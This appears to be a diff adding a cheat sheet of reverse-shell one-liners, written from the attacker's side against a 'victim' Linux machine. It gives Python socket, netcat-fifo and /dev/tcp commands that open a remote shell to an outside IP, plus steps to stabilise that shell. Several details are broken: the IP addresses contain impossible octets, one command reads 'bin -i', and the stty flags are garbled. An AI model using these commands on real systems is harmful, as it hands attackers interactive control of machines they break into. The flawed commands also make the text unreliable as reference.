@@ -1,0 +1,34 @@
+# python reverse shell
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.159.363",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+#After getting the reverse shell we need to make our shell stable
+use python for stable shell: 
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+or
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+if python does not support in victim server then we can use
+
+script -qc /bin/bash /dev/null
+or
+bash
+or
+/bin/bash
+or
+/bin/bash -p
+
+2nd step 
+victim@linux:~$ export TERM=xterm //it is used to make the shell more stable by connecting with your local machine
+ctrl+z //it will backgroud your shell but dont use ctrl+c it will disconnect your from victim shell
+3rd step
+attacker@linux:~$ stty echo -raw ; fg
+victim@linux:~$
+if python does not work we have more commands
+
+# in sh file you can use this two code to get reverse shell so save the code in file.sh
+victim@linux:~$ nano file.sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.159.332 443 >/tmp/f
+
+or 
+bin -i >& /dev/tcp/10.21.23.434/4444 0>&1
+
+
